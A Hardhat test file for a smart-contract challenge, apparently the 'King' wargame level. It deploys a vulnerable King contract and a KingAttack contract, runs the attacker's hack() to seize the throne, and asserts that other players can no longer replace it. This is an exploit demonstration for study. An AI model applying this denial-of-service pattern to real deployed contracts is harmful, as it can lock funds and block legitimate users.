const { ethers, deployments, getNamedAccounts, waffle } = require("hardhat")
const { deploy } = deployments
const { assert, expect } = require("chai")

describe("King Test", () => {
    let king, kingAttack, deployer, player, attacker
    beforeEach(async () => {
        deployer = (await getNamedAccounts()).deployer
        const accounts = await ethers.getSigners()
        player = accounts[1]
        attacker = accounts[2]
        const prize = ethers.utils.parseEther("0.001")

        const deployKing = await deploy("King", {
            from: deployer,
            value: prize,
            args: [],
        })

        await deploy("KingAttack", {
            from: attacker.address,
            args: [deployKing.address],
        })
        king = await ethers.getContract("King")
        kingAttack = await ethers.getContract("KingAttack")
    })
    describe("Cotract Initialization", () => {
        it("Prize sets correctly", async () => {
            const prizrKing = await king.prize()
            const kingaddress = await king._king()
            assert.equal(prizrKing.toString(), ethers.utils.parseEther("0.001"))
            assert.equal(kingaddress.toString(), deployer)
        })
    })
    describe("attacker attacks to the contract", () => {
        it("Hack it", async () => {
            const provider = waffle.provider
            const hackerPrize = ethers.utils.parseEther("0.002")
            const fund = ethers.utils.parseEther("0.003")
            const fundingContract = await kingAttack.addMoney({ value: fund })
            await fundingContract.wait(1)
            const newBfsf = await provider.getBalance(kingAttack.address)
            console.log(`The balance of your contract is ${newBfsf.toString()}`)
            await kingAttack.hack(hackerPrize)
            const newKing = await king._king()
            const newPrize = await king.prize()

            assert.equal(newPrize.toString(), hackerPrize)
            assert.equal(newKing.toString(), kingAttack.address)
        })
        it("someone else can't replace the newking", async () => {
            const newPrize = ethers.utils.parseEther("1")
            await expect(
                player.sendTransaction({
                    to: king.address,
                    value: newPrize,
                    gasLimit: "10000000",
                })
            ).to.be.revertedWith(
                "function selector was not recognized and there's no fallback nor receive function"
            )
        })
    })
})
